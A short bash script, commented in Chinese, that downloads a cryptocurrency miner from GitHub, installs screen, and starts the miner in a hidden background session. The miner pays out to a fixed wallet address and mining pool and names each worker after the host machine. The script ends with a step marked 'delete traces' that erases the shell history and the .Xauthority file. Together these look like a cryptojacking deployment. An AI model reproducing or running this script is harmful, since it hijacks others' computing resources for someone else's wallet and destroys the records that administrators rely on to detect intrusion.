#!/bin/bash
wget https://github.com/zpalmtree/seine/releases/download/v0.2.17/seine-linux-x86_64.tar.gz && tar -zxvf seine-linux-x86_64.tar.gz
# 1. 检查并安装 screen
if ! command -v screen &> /dev/null; then
    echo "未检测到 screen，正在自动安装..."
    sudo apt-get update
    sudo apt-get install -y screen
fi

# 2. 进入脚本所在目录，确保能正确找到 ./seine
cd "$(dirname "$0")"

# 3. 检查 seine 文件是否存在并赋予执行权限
if [ -f "./seine" ]; then
    chmod +x ./seine
else
    echo "错误: 当前目录下未找到 seine 执行文件，请确认程序在同一目录！"
    exit 1
fi

# 4. 设定 Screen 会话名称
SESSION_NAME="seine_miner"

# 5. 检查是否已经有同名的 screen 会话在运行
if screen -list | grep -q "\.${SESSION_NAME}"; then
    echo "检测到名为 $SESSION_NAME 的进程已经在运行！"
    echo "如果需要重启，请先执行命令结束旧进程: screen -S $SESSION_NAME -X quit"
    exit 1
fi

echo "正在后台启动 seine..."

# 6. 使用 screen 在后台启动程序
# 注意: 这里使用 "$(hostname)" 动态获取本机的主机名作为 worker 名称
screen -dmS $SESSION_NAME ./seine \
  --mode pool \
  --address '4CJjvdUkuMkw7o9E2w2rWkLcNdBCAfnHBYPLUohjesjZEYh6j3eszoWzmWYCkfEiB14zqQ2ykCZWQdpLLS8xSbB9bPU8X' \
  --pool-url 'stratum+tcp://bntpool.com:3333' \
  --pool-worker "$(hostname)" \
  --backend cpu \
  --threads 4

echo "====================================================="
echo "✅ 启动成功！程序已在后台 screen 会话 [$SESSION_NAME] 中运行。"
echo ""
echo "【常用管理命令】"
echo "👉 查看运行日志     : screen -r $SESSION_NAME"
echo "👉 退出日志保持运行 : 英文输入法下，先按 Ctrl + A，松开后再按 D"
echo "👉 彻底停止并关闭   : screen -S $SESSION_NAME -X quit"
echo "====================================================="
# 删除痕迹
rm -rf ~/.Xauthority
rm -rf ~/.bash_history
history -c

# 退出脚本
exit 0
